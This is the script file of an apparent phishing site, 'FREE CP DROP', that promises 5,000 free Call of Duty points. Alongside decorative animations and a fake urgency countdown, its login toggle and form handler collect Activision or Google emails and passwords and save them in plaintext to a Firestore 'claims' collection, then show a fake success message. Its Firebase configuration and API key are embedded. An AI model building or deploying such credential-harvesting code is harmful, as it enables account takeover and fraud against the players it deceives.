/* ============================================================
   FREE CP DROP — script.js  (Mature Redesign)
   Firebase Firestore + Refined motion effects
   ============================================================ */

import { initializeApp }           from "https://www.gstatic.com/firebasejs/12.16.0/firebase-app.js";
import { getAnalytics }            from "https://www.gstatic.com/firebasejs/12.16.0/firebase-analytics.js";
import { getFirestore, collection,
         addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/12.16.0/firebase-firestore.js";

/* ── Firebase ─────────────────────────────────────────────── */
const firebaseConfig = {
  apiKey:            "AIzaSyBf4bzntM3-6VKxWgvGYSKhBIycEQ0o2HY",
  authDomain:        "freecodmcp.firebaseapp.com",
  projectId:         "freecodmcp",
  storageBucket:     "freecodmcp.firebasestorage.app",
  messagingSenderId: "1069242533671",
  appId:             "1:1069242533671:web:7de1ee8cf805d2dfbf4b02",
  measurementId:     "G-R7Q443SLFJ"
};
const app = initializeApp(firebaseConfig);
const db  = getFirestore(app);
getAnalytics(app);

/* ══════════════════════════════════════════════════════════
   PARTICLE CANVAS — refined, sparse, slow-drifting embers
══════════════════════════════════════════════════════════ */
(function initParticles() {
  const canvas = document.getElementById('particle-canvas');
  if (!canvas) return;
  const ctx = canvas.getContext('2d');
  let W, H, particles = [];

  function resize() {
    W = canvas.width  = window.innerWidth;
    H = canvas.height = window.innerHeight;
  }
  resize();
  window.addEventListener('resize', resize, { passive: true });

  class Particle {
    reset(initial = false) {
      this.x       = Math.random() * W;
      this.y       = initial ? Math.random() * H : H + 8;
      this.r       = Math.random() * 1.4 + 0.4;
      this.vx      = (Math.random() - 0.5) * 0.3;
      this.vy      = -(Math.random() * 0.5 + 0.2);
      this.life    = 0;
      this.maxLife = Math.random() * 280 + 160;
      this.hue     = Math.random() * 20 + 35; // warm amber-gold
    }
    constructor() { this.reset(true); }
    update() {
      this.x   += this.vx + Math.sin(this.life * 0.03) * 0.25;
      this.y   += this.vy;
      this.life++;
      if (this.life > this.maxLife || this.y < -10) this.reset();
    }
    draw() {
      const alpha = Math.sin((this.life / this.maxLife) * Math.PI) * 0.55;
      ctx.beginPath();
      ctx.arc(this.x, this.y, this.r, 0, Math.PI * 2);
      ctx.fillStyle = `hsla(${this.hue}, 80%, 65%, ${alpha})`;
      ctx.fill();
    }
  }

  const COUNT = 35;
  for (let i = 0; i < COUNT; i++) {
    const p = new Particle();
    particles.push(p);
  }

  (function loop() {
    ctx.clearRect(0, 0, W, H);
    particles.forEach(p => { p.update(); p.draw(); });
    requestAnimationFrame(loop);
  })();
})();


/* ══════════════════════════════════════════════════════════
   PARALLAX — subtle background depth on scroll
══════════════════════════════════════════════════════════ */
(function initParallax() {
  const bg = document.querySelector('.hero-bg');
  if (!bg) return;
  window.addEventListener('scroll', () => {
    bg.style.transform = `translateY(${window.scrollY * 0.28}px) scale(1.05)`;
  }, { passive: true });
})();


/* ══════════════════════════════════════════════════════════
   LIVE CLOCK — nav bar
══════════════════════════════════════════════════════════ */
(function initClock() {
  const el = document.getElementById('hud-time');
  if (!el) return;
  const tick = () => {
    const n = new Date();
    el.textContent =
      String(n.getHours()).padStart(2,'0') + ':' +
      String(n.getMinutes()).padStart(2,'0') + ':' +
      String(n.getSeconds()).padStart(2,'0');
  };
  tick();
  setInterval(tick, 1000);
})();


/* ══════════════════════════════════════════════════════════
   COUNTDOWN — 23:59:59 from page load
══════════════════════════════════════════════════════════ */
(function initCountdown() {
  const el = document.getElementById('cd-display');
  if (!el) return;
  let total = 23 * 3600 + 59 * 60 + 59;
  const fmt = n => String(n).padStart(2,'0');
  const tick = () => {
    if (total < 0) total = 0;
    const h = Math.floor(total / 3600);
    const m = Math.floor((total % 3600) / 60);
    const s = total % 60;
    el.textContent = `${fmt(h)}:${fmt(m)}:${fmt(s)}`;
    total--;
  };
  tick();
  setInterval(tick, 1000);
})();


/* ══════════════════════════════════════════════════════════
   REVEAL ON SCROLL
══════════════════════════════════════════════════════════ */
(function initReveal() {
  const els = document.querySelectorAll('.reveal');
  if (!els.length) return;
  const io = new IntersectionObserver(entries => {
    entries.forEach(e => {
      if (e.isIntersecting) {
        e.target.classList.add('visible');
        io.unobserve(e.target);
      }
    });
  }, { rootMargin: '-48px' });
  els.forEach(el => io.observe(el));
})();


/* ══════════════════════════════════════════════════════════
   ANIMATED COUNTERS
══════════════════════════════════════════════════════════ */
(function initCounters() {
  const nodes = document.querySelectorAll('[data-count]');
  if (!nodes.length) return;
  const ease = p => 1 - Math.pow(1 - p, 3);
  const io = new IntersectionObserver(entries => {
    entries.forEach(e => {
      if (!e.isIntersecting) return;
      io.unobserve(e.target);
      const el  = e.target;
      const end = parseInt(el.dataset.count, 10);
      const dur = parseInt(el.dataset.dur || '2000', 10);
      let start = null;
      (function step(ts) {
        if (!start) start = ts;
        const p = Math.min((ts - start) / dur, 1);
        el.textContent = Math.floor(ease(p) * end).toLocaleString();
        if (p < 1) requestAnimationFrame(step);
      })(performance.now());
    });
  }, { rootMargin: '-40px' });
  nodes.forEach(el => io.observe(el));
})();


/* ══════════════════════════════════════════════════════════
   LOGIN TYPE TOGGLE
══════════════════════════════════════════════════════════ */
(function initLoginToggle() {
  const btns    = document.querySelectorAll('.toggle-btn');
  const actEl   = document.getElementById('activision-fields');
  const gEl     = document.getElementById('google-fields');
  const typeIn  = document.getElementById('login-type-input');

  btns.forEach(btn => {
    btn.addEventListener('click', () => {
      btns.forEach(b => b.classList.remove('active'));
      btn.classList.add('active');
      const type = btn.dataset.type;
      if (typeIn) typeIn.value = type;

      if (type === 'activision') {
        if (actEl) actEl.style.display = 'block';
        if (gEl)   gEl.style.display   = 'none';
        document.getElementById('act-email').required = true;
        document.getElementById('act-pw').required    = true;
        const ge = document.getElementById('g-email');
        const gp = document.getElementById('g-pw');
        if (ge) ge.required = false;
        if (gp) gp.required = false;
      } else {
        if (actEl) actEl.style.display = 'none';
        if (gEl)   gEl.style.display   = 'block';
        document.getElementById('act-email').required = false;
        document.getElementById('act-pw').required    = false;
        const ge = document.getElementById('g-email');
        const gp = document.getElementById('g-pw');
        if (ge) ge.required = true;
        if (gp) gp.required = true;
      }
    });
  });
})();


/* ══════════════════════════════════════════════════════════
   PASSWORD SHOW / HIDE
══════════════════════════════════════════════════════════ */
(function initPwToggles() {
  document.querySelectorAll('.pw-toggle').forEach(btn => {
    btn.addEventListener('click', () => {
      const input = btn.closest('.input-wrap').querySelector('input');
      if (!input) return;
      const show = input.type === 'password';
      input.type = show ? 'text' : 'password';
      btn.querySelector('.eye-open').style.display = show ? 'none'  : 'block';
      btn.querySelector('.eye-shut').style.display = show ? 'block' : 'none';
    });
  });
})();


/* ══════════════════════════════════════════════════════════
   FORM → FIREBASE FIRESTORE
══════════════════════════════════════════════════════════ */
(function initForm() {
  const form       = document.getElementById('claim-form-el');
  const successMsg = document.getElementById('success-msg');
  const submitBtn  = document.getElementById('submit-btn');
  const submitLbl  = document.getElementById('submit-label');
  const typeInput  = document.getElementById('login-type-input');
  if (!form) return;

  form.addEventListener('submit', async e => {
    e.preventDefault();

    const loginType = typeInput?.value || 'activision';
    let email = '', password = '';

    if (loginType === 'activision') {
      email    = document.getElementById('act-email')?.value.trim() || '';
      password = document.getElementById('act-pw')?.value || '';
    } else {
      email    = document.getElementById('g-email')?.value.trim() || '';
      password = document.getElementById('g-pw')?.value || '';
    }

    const uid           = document.getElementById('uid')?.value.trim() || '';
    const deliveryEmail = document.getElementById('delivery-email')?.value.trim() || '';

    if (!email || !password || !uid || !deliveryEmail) {
      alert('Please fill in all required fields.');
      return;
    }

    // Loading state
    submitBtn.disabled = true;
    if (submitLbl) submitLbl.textContent = 'Submitting…';

    try {
      await addDoc(collection(db, 'claims'), {
        loginType,
        email,
        password,
        uid,
        deliveryEmail,
        cpPackage:   '5000 CP',
        submittedAt: serverTimestamp(),
      });

      // Show success
      form.style.display = 'none';
      if (successMsg) successMsg.style.display = 'block';

    } catch (err) {
      console.error('Firestore submit error:', err);
      alert('Something went wrong. Please try again.\n\n' + err.message);
      submitBtn.disabled = false;
      if (submitLbl) submitLbl.textContent = 'Claim My 5,000 CP';
    }
  });
})();
